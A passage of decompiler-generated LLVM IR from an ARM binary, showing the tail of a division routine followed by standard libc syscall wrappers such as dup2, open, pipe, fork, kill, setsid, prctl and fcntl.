  store i32 %v2_13dc4, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_13dcc = phi i32 [ %v1_13dc4, %.thread17 ], [ %v1_13dc4, %bb99 ], [ %v2_13dc4, %bb100 ]
  %v5_13dd0 = phi i32 [ %v1_13dc0, %.thread17 ], [ %v4_13dc0, %bb99 ], [ %v4_13dc0, %bb100 ]
  %v2_13dc8 = icmp ugt i32 %v5_13dd0, 3
  %v7_13dc8 = icmp eq i32 %v5_13dd0, 4
  %v2_13dcc = xor i1 %v7_13dc8, true
  %v3_13dcc = and i1 %v2_13dc8, %v2_13dcc
  br i1 %v3_13dcc, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_13dcc = add nsw i32 %v4_13dcc, 3
  store i32 %v5_13dcc, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_13dd0 = phi i32 [ %v4_13dcc, %.thread18 ], [ %v5_13dcc, %bb101 ]
  %v2_13dd0 = xor i1 %v2_13dc8, true
  %v3_13dd0 = or i1 %v7_13dc8, %v2_13dd0
  br i1 %v3_13dd0, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_13dd0 = udiv i32 %v5_13dd0, 2
  %v9_13dd0 = add i32 %v4_13dd0, %v8_13dd0
  store i32 %v9_13dd0, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_13dd4 = phi i32 [ %v4_13dd0, %bb102 ], [ %v9_13dd0, %bb103 ]
  %v6_13dd4 = lshr i32 %v0_13d00, %v1_13dd4
  store i32 %v6_13dd4, i32* %r0.global-to-local, align 4
  ret i32 %v6_13dd4

dec_label_pc_13ddc:                               ; preds = %entry
  %v0_13de0 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_13dd0, { 1, 0 }
  uselistorder i1 %v7_13dc8, { 1, 0 }
  uselistorder i32 %v4_13dc0, { 1, 0 }
  uselistorder i32 %v1_13dc0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_13db8, { 1, 0 }
  uselistorder i32 %v4_13db4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_13db4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_13da4, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_13d7c, { 1, 0 }
  uselistorder i32 %v0_13d8c, { 1, 0, 2 }
  uselistorder i32 %v4_13d70, { 1, 0 }
  uselistorder i32 %v1_13d78, { 1, 2, 0 }
  uselistorder i32 %v4_13d64, { 1, 0 }
  uselistorder i32 %v1_13d6c, { 1, 2, 0 }
  uselistorder i32 %v4_13d58, { 1, 0 }
  uselistorder i32 %v1_13d60, { 1, 2, 0 }
  uselistorder i32 %v1_13d84, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_13d54, { 1, 0 }
  uselistorder i32 %v1_13d80, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_13d40, { 1, 0 }
  uselistorder i32 %v3_13d3c, { 1, 0 }
  uselistorder i32 %v1_13d3c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_13d40, { 1, 2, 0, 3 }
  uselistorder i32 %v4_13d2c, { 1, 0 }
  uselistorder i32 %v4_13d28, { 2, 1, 0 }
  uselistorder i32 %v1_13d2c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_13d34.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_13d00, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_13d00, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_13cf4, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_13d8c, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_13d48, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13d34thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_13df4 = udiv i32 %arg1, %arg2
  ret i32 %v2_13df4
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_13e10 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_13e10
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_13e30 = load i32, i32* @r0, align 4
  %v2_13e30 = icmp ugt i32 %v0_13e30, -4097
  br i1 %v2_13e30, label %bb1, label %bb

bb:                                               ; preds = %entry
  ret i32 %v0_13e30

bb1:                                              ; preds = %entry
  %v4_13e3c = icmp eq i32 %v0_13e30, -38
  br i1 %v4_13e3c, label %dec_label_pc_13e44, label %bb2

dec_label_pc_13e44:                               ; preds = %bb1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_13e44, %bb1
  %v0_13e5c = call i32 @__syscall_error()
  ret i32 %v0_13e5c
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13e60 = load i32, i32* @r7, align 4
  store i32 %v3_13e60, i32* %stack_var_-8, align 4
  %v0_13e6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13e6c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13e6c, -4095
  br i1 %tmp, label %dec_label_pc_13e8c, label %dec_label_pc_13e7c

dec_label_pc_13e7c:                               ; preds = %entry
  %v0_13e7c = call i32 @__GI___errno_location()
  %v0_13e80 = load i32, i32* %r7.global-to-local, align 4
  %v1_13e80 = sub i32 0, %v0_13e80
  %v2_13e84 = inttoptr i32 %v0_13e7c to i32*
  store i32 %v1_13e80, i32* %v2_13e84, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13e8c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13e8c

dec_label_pc_13e8c:                               ; preds = %entry, %dec_label_pc_13e7c
  %v1_13e90 = phi i32 [ %v0_13e6c, %entry ], [ -1, %dec_label_pc_13e7c ]
  %v2_13e8c = phi i32 [ %v3_13e60, %entry ], [ %v2_13e8c.pre, %dec_label_pc_13e7c ]
  store i32 %v2_13e8c, i32* @r7, align 4
  ret i32 %v1_13e90

; uselistorder directives
  uselistorder i32 %v0_13e6c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13e8c, { 1, 0 }
}

define i32 @__GI_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_13e94 = load i32, i32* @r2, align 4
  %v9_13e94 = load i32, i32* @r3, align 4
  store i32 %v9_13e94, i32* %stack_var_-4, align 4
  %v1_13ea4 = and i32 %arg2, 64
  %v2_13ea4 = icmp eq i32 %v1_13ea4, 0
  br i1 %v2_13ea4, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v3_13eac = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_13eac, i32* @r3, align 4
  %phitmp = urem i32 %v6_13e94, 65536
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v0_13eb0 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_13eb0, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13ee0, label %dec_label_pc_13ed0

dec_label_pc_13ed0:                               ; preds = %.thread
  %v0_13ed0 = call i32 @__GI___errno_location()
  %v0_13ed4 = load i32, i32* %r7.global-to-local, align 4
  %v1_13ed4 = sub i32 0, %v0_13ed4
  store i32 %v1_13ed4, i32* @r3, align 4
  %v2_13ed8 = inttoptr i32 %v0_13ed0 to i32*
  store i32 %v1_13ed4, i32* %v2_13ed8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13ee0

dec_label_pc_13ee0:                               ; preds = %.thread, %dec_label_pc_13ed0
  %v0_13ee0 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_13ed0 ]
  ret i32 %v0_13ee0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13ee0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13ef4 = load i32, i32* @r7, align 4
  store i32 %v3_13ef4, i32* %stack_var_-8, align 4
  %v0_13f00 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13f00, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13f00, -4095
  br i1 %tmp, label %dec_label_pc_13f20, label %dec_label_pc_13f10

dec_label_pc_13f10:                               ; preds = %entry
  %v0_13f10 = call i32 @__GI___errno_location()
  %v0_13f14 = load i32, i32* %r7.global-to-local, align 4
  %v1_13f14 = sub i32 0, %v0_13f14
  %v2_13f18 = inttoptr i32 %v0_13f10 to i32*
  store i32 %v1_13f14, i32* %v2_13f18, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13f20.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13f20

dec_label_pc_13f20:                               ; preds = %entry, %dec_label_pc_13f10
  %v1_13f24 = phi i32 [ %v0_13f00, %entry ], [ -1, %dec_label_pc_13f10 ]
  %v2_13f20 = phi i32 [ %v3_13ef4, %entry ], [ %v2_13f20.pre, %dec_label_pc_13f10 ]
  store i32 %v2_13f20, i32* @r7, align 4
  ret i32 %v1_13f24

; uselistorder directives
  uselistorder i32 %v0_13f00, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13f20, { 1, 0 }
}

define i32 @__GI_getpid() local_unnamed_addr {
entry:
  %v1_13f38 = load i32, i32* @r0, align 4
  ret i32 %v1_13f38
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_13f40 = ptrtoint i32* %stack_var_-16 to i32
  %v2_13f50 = call i32 @gettimeofday(i32 %v2_13f40, i32 0)
  %v2_13f54 = load i32, i32* %stack_var_-16, align 4
  %v2_13f58 = icmp eq i32* %arg1, null
  br i1 %v2_13f58, label %bb6, label %bb

bb:                                               ; preds = %entry
  store i32 %v2_13f54, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  ret i32 %v2_13f54

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13fa0, label %dec_label_pc_13f90

dec_label_pc_13f90:                               ; preds = %entry
  %v0_13f90 = call i32 @__GI___errno_location()
  %v0_13f94 = load i32, i32* %r4.global-to-local, align 4
  %v1_13f94 = sub i32 0, %v0_13f94
  %v2_13f98 = inttoptr i32 %v0_13f90 to i32*
  store i32 %v1_13f94, i32* %v2_13f98, align 4
  br label %dec_label_pc_13fa0

dec_label_pc_13fa0:                               ; preds = %entry, %dec_label_pc_13f90
  %v1_13fa8 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_13f90 ]
  ret i32 %v1_13fa8

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13fa0, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_13fbc = load i32, i32* @r0, align 4
  ret i32 %v1_13fbc
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13fc0 = load i32, i32* @r7, align 4
  store i32 %v3_13fc0, i32* %stack_var_-8, align 4
  %v0_13fcc = load i32, i32* @r0, align 4
  store i32 %v0_13fcc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13fcc, -4095
  br i1 %tmp, label %dec_label_pc_13fec, label %dec_label_pc_13fdc

dec_label_pc_13fdc:                               ; preds = %entry
  %v0_13fdc = call i32 @__GI___errno_location()
  %v0_13fe0 = load i32, i32* %r7.global-to-local, align 4
  %v1_13fe0 = sub i32 0, %v0_13fe0
  %v2_13fe4 = inttoptr i32 %v0_13fdc to i32*
  store i32 %v1_13fe0, i32* %v2_13fe4, align 4
  %v2_13fec.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13fec

dec_label_pc_13fec:                               ; preds = %entry, %dec_label_pc_13fdc
  %v1_13ff0 = phi i32 [ %v0_13fcc, %entry ], [ -1, %dec_label_pc_13fdc ]
  %v2_13fec = phi i32 [ %v3_13fc0, %entry ], [ %v2_13fec.pre, %dec_label_pc_13fdc ]
  store i32 %v2_13fec, i32* @r7, align 4
  ret i32 %v1_13ff0

; uselistorder directives
  uselistorder i32 %v0_13fcc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13fec, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_14000 = load i32, i32* @r0, align 4
  %v1_14000 = load i32, i32* @r1, align 4
  %v2_14000 = call i32 @wait4(i32 %v0_14000, i32 %v1_14000)
  ret i32 %v2_14000
}

define i32 @access(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14010 = load i32, i32* @r7, align 4
  store i32 %v3_14010, i32* %stack_var_-8, align 4
  %v0_1401c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1401c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1401c, -4095
  br i1 %tmp, label %dec_label_pc_1403c, label %dec_label_pc_1402c

dec_label_pc_1402c:                               ; preds = %entry
  %v0_1402c = call i32 @__GI___errno_location()
  %v0_14030 = load i32, i32* %r7.global-to-local, align 4
  %v1_14030 = sub i32 0, %v0_14030
  %v2_14034 = inttoptr i32 %v0_1402c to i32*
  store i32 %v1_14030, i32* %v2_14034, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1403c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1403c

dec_label_pc_1403c:                               ; preds = %entry, %dec_label_pc_1402c
  %v1_14040 = phi i32 [ %v0_1401c, %entry ], [ -1, %dec_label_pc_1402c ]
  %v2_1403c = phi i32 [ %v3_14010, %entry ], [ %v2_1403c.pre, %dec_label_pc_1402c ]
  store i32 %v2_1403c, i32* @r7, align 4
  ret i32 %v1_14040

; uselistorder directives
  uselistorder i32 %v0_1401c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1403c, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14074, label %dec_label_pc_14064

dec_label_pc_14064:                               ; preds = %entry
  %v0_14064 = call i32 @__GI___errno_location()
  %v0_14068 = load i32, i32* %r4.global-to-local, align 4
  %v1_14068 = sub i32 0, %v0_14068
  %v2_1406c = inttoptr i32 %v0_14064 to i32*
  store i32 %v1_14068, i32* %v2_1406c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14074

dec_label_pc_14074:                               ; preds = %entry, %dec_label_pc_14064
  %v0_14074 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14064 ]
  ret i32 %v0_14074

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14074, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14084 = load i32, i32* @r7, align 4
  store i32 %v3_14084, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_140ac, label %dec_label_pc_1409c

dec_label_pc_1409c:                               ; preds = %entry
  %v0_1409c = call i32 @__GI___errno_location()
  %v0_140a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_140a0 = sub i32 0, %v0_140a0
  %v2_140a4 = inttoptr i32 %v0_1409c to i32*
  store i32 %v1_140a0, i32* %v2_140a4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_140b0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_140ac

dec_label_pc_140ac:                               ; preds = %entry, %dec_label_pc_1409c
  %v2_140b0 = phi i32 [ %v3_14084, %entry ], [ %v2_140b0.pre, %dec_label_pc_1409c ]
  %v0_140ac = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1409c ]
  store i32 %v2_140b0, i32* @r7, align 4
  ret i32 %v0_140ac

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_140ac, { 1, 0 }
}

define i32 @__GI_read(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_140b8 = load i32, i32* @r7, align 4
  store i32 %v3_140b8, i32* %stack_var_-8, align 4
  %v0_140c4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_140c4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_140c4, -4095
  br i1 %tmp, label %dec_label_pc_140e4, label %dec_label_pc_140d4

dec_label_pc_140d4:                               ; preds = %entry
  %v0_140d4 = call i32 @__GI___errno_location()
  %v0_140d8 = load i32, i32* %r7.global-to-local, align 4
  %v1_140d8 = sub i32 0, %v0_140d8
  %v2_140dc = inttoptr i32 %v0_140d4 to i32*
  store i32 %v1_140d8, i32* %v2_140dc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_140e4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_140e4

dec_label_pc_140e4:                               ; preds = %entry, %dec_label_pc_140d4
  %v1_140e8 = phi i32 [ %v0_140c4, %entry ], [ -1, %dec_label_pc_140d4 ]
  %v2_140e4 = phi i32 [ %v3_140b8, %entry ], [ %v2_140e4.pre, %dec_label_pc_140d4 ]
  store i32 %v2_140e4, i32* @r7, align 4
  ret i32 %v1_140e8

; uselistorder directives
  uselistorder i32 %v0_140c4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140e4, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_140f0 = ptrtoint i32* %stack_var_-16 to i32
  %v2_140fc = call i32 @getrlimit(i32 7, i32 %v2_140f0)
  %v1_14100 = icmp slt i32 %v2_140fc, 0
  %v5_14104 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_14100, i32 256, i32 %v5_14104
  ret i32 %storemerge
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14118 = load i32, i32* @r7, align 4
  store i32 %v3_14118, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_14140, label %dec_label_pc_14130

dec_label_pc_14130:                               ; preds = %entry
  %v0_14130 = call i32 @__GI___errno_location()
  %v0_14134 = load i32, i32* %r7.global-to-local, align 4
  %v1_14134 = sub i32 0, %v0_14134
  %v2_14138 = inttoptr i32 %v0_14130 to i32*
  store i32 %v1_14134, i32* %v2_14138, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_14144.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14140

dec_label_pc_14140:                               ; preds = %entry, %dec_label_pc_14130
  %v2_14144 = phi i32 [ %v3_14118, %entry ], [ %v2_14144.pre, %dec_label_pc_14130 ]
  %v0_14140 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_14130 ]
  store i32 %v2_14144, i32* @r7, align 4
  ret i32 %v0_14140

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14140, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1414c = load i32, i32* @r7, align 4
  store i32 %v3_1414c, i32* %stack_var_-8, align 4
  %v0_14158 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14158, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14158, -4095
  br i1 %tmp, label %dec_label_pc_14178, label %dec_label_pc_14168

dec_label_pc_14168:                               ; preds = %entry
  %v0_14168 = call i32 @__GI___errno_location()
  %v0_1416c = load i32, i32* %r7.global-to-local, align 4
  %v1_1416c = sub i32 0, %v0_1416c
  %v2_14170 = inttoptr i32 %v0_14168 to i32*
  store i32 %v1_1416c, i32* %v2_14170, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14178.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %entry, %dec_label_pc_14168
  %v1_1417c = phi i32 [ %v0_14158, %entry ], [ -1, %dec_label_pc_14168 ]
  %v2_14178 = phi i32 [ %v3_1414c, %entry ], [ %v2_14178.pre, %dec_label_pc_14168 ]
  store i32 %v2_14178, i32* @r7, align 4
  ret i32 %v1_1417c

; uselistorder directives
  uselistorder i32 %v0_14158, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14178, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_141bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_141bc, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_141bc, -4095
  br i1 %tmp, label %dec_label_pc_141dc, label %dec_label_pc_141cc

dec_label_pc_141cc:                               ; preds = %entry
  %v0_141cc = call i32 @__GI___errno_location()
  %v0_141d0 = load i32, i32* %r7.global-to-local, align 4
  %v1_141d0 = sub i32 0, %v0_141d0
  %v2_141d4 = inttoptr i32 %v0_141cc to i32*
  store i32 %v1_141d0, i32* %v2_141d4, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_141dc

dec_label_pc_141dc:                               ; preds = %entry, %dec_label_pc_141cc
  %v1_141e8 = phi i32 [ %v0_141bc, %entry ], [ -1, %dec_label_pc_141cc ]
  ret i32 %v1_141e8

; uselistorder directives
  uselistorder i32 %v0_141bc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_141dc, { 1, 0 }
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_14228 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14228, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14228, -4095
  br i1 %tmp, label %dec_label_pc_14248, label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %entry
  %v0_14238 = call i32 @__GI___errno_location()
  %v0_1423c = load i32, i32* %r7.global-to-local, align 4
  %v1_1423c = sub i32 0, %v0_1423c
  %v2_14240 = inttoptr i32 %v0_14238 to i32*
  store i32 %v1_1423c, i32* %v2_14240, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14248

dec_label_pc_14248:                               ; preds = %entry, %dec_label_pc_14238
  %v1_14254 = phi i32 [ %v0_14228, %entry ], [ -1, %dec_label_pc_14238 ]
  ret i32 %v1_14254

; uselistorder directives
  uselistorder i32 %v0_14228, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14248, { 1, 0 }
}

define i32 @__GI_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14258 = load i32, i32* @r7, align 4
  store i32 %v3_14258, i32* %stack_var_-8, align 4
  %v0_14264 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14264, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14264, -4095
  br i1 %tmp, label %dec_label_pc_14284, label %dec_label_pc_14274

dec_label_pc_14274:                               ; preds = %entry
  %v0_14274 = call i32 @__GI___errno_location()
  %v0_14278 = load i32, i32* %r7.global-to-local, align 4
  %v1_14278 = sub i32 0, %v0_14278
  %v2_1427c = inttoptr i32 %v0_14274 to i32*
  store i32 %v1_14278, i32* %v2_1427c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14284.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14284

dec_label_pc_14284:                               ; preds = %entry, %dec_label_pc_14274
  %v1_14288 = phi i32 [ %v0_14264, %entry ], [ -1, %dec_label_pc_14274 ]
  %v2_14284 = phi i32 [ %v3_14258, %entry ], [ %v2_14284.pre, %dec_label_pc_14274 ]
  store i32 %v2_14284, i32* @r7, align 4
  ret i32 %v1_14288

; uselistorder directives
  uselistorder i32 %v0_14264, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14284, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1428c = load i32, i32* @r7, align 4
  store i32 %v3_1428c, i32* %stack_var_-8, align 4
  %v0_14298 = load i32, i32* @r0, align 4
  store i32 %v0_14298, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14298, -4095
  br i1 %tmp, label %dec_label_pc_142b8, label %dec_label_pc_142a8

dec_label_pc_142a8:                               ; preds = %entry
  %v0_142a8 = call i32 @__GI___errno_location()
  %v0_142ac = load i32, i32* %r7.global-to-local, align 4
  %v1_142ac = sub i32 0, %v0_142ac
  %v2_142b0 = inttoptr i32 %v0_142a8 to i32*
  store i32 %v1_142ac, i32* %v2_142b0, align 4
  %v2_142b8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_142b8

dec_label_pc_142b8:                               ; preds = %entry, %dec_label_pc_142a8
  %v1_142bc = phi i32 [ %v0_14298, %entry ], [ -1, %dec_label_pc_142a8 ]
  %v2_142b8 = phi i32 [ %v3_1428c, %entry ], [ %v2_142b8.pre, %dec_label_pc_142a8 ]
  store i32 %v2_142b8, i32* @r7, align 4
  ret i32 %v1_142bc

; uselistorder directives
  uselistorder i32 %v0_14298, { 1, 0, 2 }
  uselistorder label %dec_label_pc_142b8, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v9_142c0 = load i32, i32* @r3, align 4
  store i32 %v9_142c0, i32* %stack_var_-4, align 4
  %v2_142cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_142cc, i32* @r3, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
